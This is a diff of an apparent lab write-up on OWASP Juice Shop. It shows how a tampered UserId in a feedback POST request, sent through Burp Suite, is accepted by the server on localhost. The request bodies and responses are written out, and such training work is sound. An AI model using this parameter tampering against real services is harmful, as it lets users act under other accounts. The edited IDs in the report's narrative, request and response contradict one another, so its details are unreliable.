@@ -13,7 +13,7 @@ Goal: Check whether a user can modify the `UserId` field and submit feedback on 
 4. Navigated to **Feedback** page and submitted a normal feedback.
 5. Burp Suite captured the POST request to `/api/Feedbacks/`.
 6. Sent the request to **Repeater**.
-7. Modified the JSON body → changed `"UserId": 16` to `"UserId": 14`.
+7. Modified the JSON body → changed `"UserId": 23` to `"UserId": 21`.
 8. Sent the modified request.
 9. Juice Shop responded with **success**, accepting the tampered User ID.
 
@@ -24,7 +24,7 @@ POST /api/Feedbacks/ HTTP/1.1
 Host: 127.0.0.1:3000
 Content-Type: application/json
 
-{"UserId":16,"captchaId":0,"captcha":"15","comment":"im not a customer (***na123@gmail.com
+{"UserId":23,"captchaId":0,"captcha":"15","comment":"im not a robot(***na123@gmail.com
 )","rating":2}
 
 ---
@@ -34,14 +34,14 @@ POST /api/Feedbacks/ HTTP/1.1
 Host: 127.0.0.1:3000
 Content-Type: application/json
 
-{"UserId":14,"captchaId":0,"captcha":"15","comment":"im not a customer (***na123@gmail.com
+{"UserId":21,"captchaId":0,"captcha":"15","comment":"im not a robot (***na123@gmail.com
 )","rating":2
 
 ---
 
 ## 5. Server Response
-The server accepted the tampered UserId and created the feedback as User 14.
-{"status":"success","data":{"id":12,"UserId":16,"comment":"im not a customer (***na123@gmail.com
+The server accepted the tampered UserId and created the feedback as User 21.
+{"status":"success","data":{"id":12,"UserId":23,"comment":"im not a robot (***na123@gmail.com
 )","rating":2,"updatedAt":"2025-12-05T04:53:49.042Z","createdAt":"2025-12-05T04:53:49.042Z"}}
 
 *(Note: The backend returns `UserId:16` even though input was tampered — this confirms missing server-side validation.)*
@@ -50,7 +50,7 @@ The server accepted the tampered UserId and created the feedback as User 14.
 
 ## 6. Evidence
 Screenshots included in the `screenshots/` folder:
-- `before.png` → original request
+- `.png` → original request
 - `after.png` → tampered request
 
 ---
